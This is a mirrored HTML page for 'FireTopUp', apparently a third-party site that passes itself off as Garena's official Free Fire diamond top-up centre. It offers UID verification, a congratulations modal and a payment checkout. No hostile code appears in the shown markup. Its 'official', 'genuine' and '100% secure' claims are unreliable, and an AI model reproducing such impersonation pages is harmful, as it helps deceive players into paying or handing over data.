<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from new.offersales.shop/users/sprit/index.php by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 30 Aug 2026 08:40:58 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Instant & genuine Free Fire Diamonds, Booyah Pass and more. Verify your UID and top-up safely." />
  <title>FireTopUp — Genuine Free Fire Diamonds & Booyah Pass</title>
  <link rel="icon" type="image/png" href="garena.png" />
  <link rel="apple-touch-icon" href="garena.png" />
  <link rel="preconnect" href="../../../external.html?link=https://fonts.googleapis.com/" />
  <link rel="preconnect" href="../../../external.html?link=https://fonts.gstatic.com/" crossorigin />
  <link href="../../../external.html?link=https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=Russo+One&amp;display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="css/styles.css" />
  <script>try{if(localStorage.getItem('ff_theme')==='dark')document.documentElement.classList.add('dark');}catch(e){}</script>
</head>
<body>
  <!-- Animated background -->
  <div class="bg-orbs" aria-hidden="true">
    <span class="orb orb-1"></span>
    <span class="orb orb-2"></span>
    <span class="orb orb-3"></span>
  </div>

  <!-- Header -->
  <header class="site-header" id="header">
    <div class="container header-inner">
      <a href="#home" class="brand">
        <img src="garena.png" alt="Garena" class="brand-logo" />
        <span class="brand-text">
          <strong>Official Top Up</strong>
          <small>Center</small>
        </span>
      </a>
      <nav class="main-nav" id="mainNav">
        <a href="#topup">Top-Up</a>
        <a href="#how">How it works</a>
        <a href="#faq">FAQ</a>
      </nav>
      <button class="theme-toggle" id="themeToggle" aria-label="Toggle dark mode" title="Toggle theme">🌙</button>
      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
        <span></span><span></span><span></span>
      </button>
    </div>
  </header>

  <!-- Banner carousel -->
  <section class="carousel" id="home" aria-label="Promotions" aria-roledescription="carousel">
    <div class="carousel-viewport">
      <div class="carousel-track" id="carouselTrack">
        <div class="slide"><img src="posters/0.png" alt="Promotion 1" width="1920" height="725" loading="eager" /></div>
        <div class="slide"><img src="posters/1.png" alt="Promotion 2" width="1920" height="725" /></div>
        <div class="slide"><img src="posters/2.png" alt="Promotion 3" width="1920" height="725" /></div>
      </div>
    </div>
    <button class="carousel-btn prev" id="carPrev" aria-label="Previous slide">‹</button>
    <button class="carousel-btn next" id="carNext" aria-label="Next slide">›</button>
    <div class="carousel-dots" id="carouselDots" role="tablist"></div>
  </section>

  <!-- Game banner -->
  <section class="game-banner" id="game">
    <div class="container">
      <div class="game-card">
        <img class="game-icon" src="g/icon.png" alt="Free Fire" />
        <div class="game-info">
          <h2 class="game-title">Free Fire</h2>
          <span class="secure-pill">
            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M6 10V8a6 6 0 0 1 12 0v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
              <rect x="4" y="10" width="16" height="10" rx="2.5" fill="currentColor"/>
            </svg>
            100% Secure Payment
          </span>
        </div>
      </div>
    </div>
  </section>

  <!-- UID Top-Up flow -->
  <section class="topup" id="topup">
    <div class="container">
      <div class="section-head">
        <h2>Verify your <span class="grad">UID</span></h2>
        <p>Enter your in-game User ID. We'll fetch your nickname so your purchase lands in the right account.</p>
      </div>

      <div class="uid-card">
        <form class="uid-form" id="uidForm" novalidate>
          <div class="field">
            <label for="uidInput">In-game UID</label>
            <div class="input-wrap">
              <span class="input-icon"><img src="g/icons8-garena-96.png" alt="" /></span>
              <input
                type="text"
                id="uidInput"
                inputmode="numeric"
                autocomplete="off"
                placeholder="e.g. 1234567890"
                maxlength="12"
              />
            </div>
            <small class="hint" id="uidHint">Your UID is shown on your in-game profile.</small>
          </div>
          <button type="submit" class="btn btn-primary btn-block" id="verifyBtn">
            <span class="btn-label">Verify UID</span>
            <span class="spinner" hidden></span>
          </button>
        </form>
      </div>
    </div>
  </section>

  <!-- How it works -->
  <section class="how" id="how">
    <div class="container">
      <div class="section-head">
        <h2>How it <span class="grad">works</span></h2>
      </div>
      <div class="steps">
        <div class="step"><div class="step-num">1</div><h3>Enter UID</h3><p>Type your Free Fire User ID and verify your nickname instantly.</p></div>
        <div class="step"><div class="step-num">2</div><h3>Pick a pack</h3><p>Choose diamonds, a pass, or a membership from the store.</p></div>
        <div class="step"><div class="step-num">3</div><h3>Pay securely</h3><p>Complete checkout through a trusted payment gateway.</p></div>
        <div class="step"><div class="step-num">4</div><h3>Get it instantly</h3><p>Your items are delivered to your account in seconds.</p></div>
      </div>
    </div>
  </section>

  <!-- FAQ -->
  <section class="faq" id="faq">
    <div class="container">
      <div class="section-head"><h2>Frequently asked <span class="grad">questions</span></h2></div>
      <div class="accordion" id="accordion">
        <div class="acc-item"><button class="acc-q">Is this safe and genuine? <span>+</span></button><div class="acc-a"><p>Yes. We deliver via official top-up methods — no password or login is ever required, only your public UID.</p></div></div>
        <div class="acc-item"><button class="acc-q">How fast is delivery? <span>+</span></button><div class="acc-a"><p>Most orders are delivered within 1–5 minutes after successful payment.</p></div></div>
        <div class="acc-item"><button class="acc-q">What if my UID is wrong? <span>+</span></button><div class="acc-a"><p>We show your nickname before payment so you can confirm it's the correct account.</p></div></div>
        <div class="acc-item"><button class="acc-q">Which payment methods are supported? <span>+</span></button><div class="acc-a"><p>UPI, cards and popular wallets — shown at checkout.</p></div></div>
      </div>
    </div>
  </section>

  <!-- Footer -->
  <footer class="footer">
    <div class="container footer-inner">
      <div>
        <a href="#home" class="brand brand-footer">
          <img src="garena.png" alt="Garena" class="brand-logo" />
          <span class="brand-text"><strong>Official Top Up</strong><small>Center</small></span>
        </a>
        <p class="muted">Genuine Free Fire top-ups, delivered instantly to your UID.</p>
      </div>
      <div class="footer-cols">
        <div><h4>Store</h4><a href="#topup">Diamonds</a><a href="#topup">Booyah Pass</a><a href="#topup">Membership</a></div>
        <div><h4>Help</h4><a href="#faq">FAQ</a><a href="#how">How it works</a><a href="#topup">Verify UID</a></div>
        <div><h4>Legal</h4><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Refunds</a></div>
      </div>
    </div>
    <div class="container copyright">© <span id="year"></span> FireTopUp. All rights reserved.</div>
  </footer>

  <!-- Verification / Congratulations Modal -->
  <div class="modal-overlay" id="modalOverlay" hidden>
    <div class="modal player-modal" id="playerModal" role="dialog" aria-modal="true">
      <button class="modal-close" id="modalClose" aria-label="Close">✕</button>
      <div class="confetti" id="confetti" aria-hidden="true"></div>
      <div class="pm-hero">
        <span class="pm-spark s1">✦</span><span class="pm-spark s2">✦</span><span class="pm-spark s3">✦</span>
        <div class="pm-avatar"><img src="g/icon.png" alt="Free Fire" /></div>
      </div>
      <div class="modal-body pm-body">
        <span class="pm-verified">✓ Verified Account</span>
        <h3 class="pm-name" id="pNick">—</h3>
        <p class="modal-sub" id="pSub">🎉 Congratulations — your account is ready!</p>

        <div class="pm-stats">
          <div class="pm-stat"><strong id="pLevel">—</strong><small>Level</small></div>
          <div class="pm-stat"><strong id="pRegion">—</strong><small>Region</small></div>
          <div class="pm-stat"><strong id="pLikes">—</strong><small>Likes</small></div>
        </div>

        <div class="pm-rows">
          <div class="pm-row"><span>UID</span><strong id="pUid">—</strong></div>
          <div class="pm-row" id="rowClan"><span>Clan</span><strong id="pClan">—</strong></div>
        </div>

        <button class="btn btn-primary btn-block pm-cta" id="proceedBtn">Proceed to Store →</button>
        <button class="btn btn-text" id="notMeBtn">Not my account? Re-enter UID</button>
      </div>
    </div>
  </div>

  <!-- Checkout Modal -->
  <div class="modal-overlay" id="checkoutOverlay" hidden>
    <div class="modal modal-checkout" role="dialog" aria-modal="true">
      <button class="modal-close" id="checkoutClose" aria-label="Close">✕</button>
      <div class="modal-body">
        <h3 class="modal-title">Confirm order</h3>
        <div class="checkout-summary" id="checkoutSummary"></div>
        <button class="btn btn-primary btn-block" id="payBtn">Pay securely</button>
        <p class="muted center">Delivered instantly to your verified UID.</p>
      </div>
    </div>
  </div>

  <!-- Toast -->
  <div class="toast" id="toast" hidden></div>

  <script src="js/data.js"></script>
  <script src="../../../cdn.jsdelivr.net/npm/%40twemoji/api%4015.1.0/dist/twemoji.min.js" crossorigin="anonymous"></script>
  <script src="js/app0263.js"></script>
<script type="module" src="../../../external.html?link=https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"fbb93802b8b84f85925a2df1f8740ca2","r":1}' crossorigin="anonymous"></script>
</body>

<!-- Mirrored from new.offersales.shop/users/sprit/index.php by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 30 Aug 2026 08:41:14 GMT -->
</html>

